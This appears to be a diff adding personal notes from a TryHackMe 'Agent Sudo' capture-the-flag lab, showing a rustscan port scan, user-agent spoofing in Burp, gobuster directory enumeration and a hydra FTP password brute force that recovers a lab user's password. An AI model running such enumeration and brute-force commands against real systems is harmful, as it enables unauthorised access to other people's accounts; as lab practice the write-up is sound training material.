@@ -1,0 +1,63 @@
+rusrustscan -a 10.10.115.123
+
+PORT   STATE SERVICE REASON
+21/tcp open  ftp     syn-ack
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+
+
+After analyzing the website, it seems that we need to change the "user agent" to our "codename"
+With the tryhackme tip, it's now easy to change the user agent in the burpsuite proxy to "C"
+
+Now, the next webpage content is 
+
+"
+Attention chris,
+
+Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
+
+From,
+Agent R
+"
+
+Also tried to use gobuster with user agent "C", but no lucky
+
+@linux ➜ agentsudoctf  gobuster dir -w /opt/wordlists/Discovery/Web-content/common.txt -t 10 -u 10.10.220.215 -a C
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.220.215
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /opt/wordlists/Discovery/Web-content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              C
+[+] Timeout:                 10s
+===============================================================
+2023/03/24 19:15:16 Starting gobuster in directory enumeration mode
+===============================================================
+/.htaccess            (Status: 403) [Size: 278]
+/.hta                 (Status: 403) [Size: 278]
+/.htpasswd            (Status: 403) [Size: 278]
+/index.php            (Status: 302) [Size: 218] [--> agent_C_attention.php]
+/server-status        (Status: 403) [Size: 278]                            
+                                                                           
+===============================================================
+2023/03/24 19:17:18 Finished
+===============================================================
+
+
+####
+FTP Password brute force with hydra
+
+@linux ➜ agentsudoctf  hydra -P /opt/wordlists/Passwords/10-million-password-list-top-100000.txt ftp://10.10.220.215 -l chris
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-24 19:20:38
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 100000 login tries (l:1/p:100000), ~6250 tries per task
+[DATA] attacking ftp://10.10.220.215:21/
+[STATUS] 145.00 tries/min, 145 tries in 00:01h, 99855 to do in 11:29h, 16 active
+[21][ftp] host: 10.10.220.215   login: chris   password: crystal
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-24 19:22:34
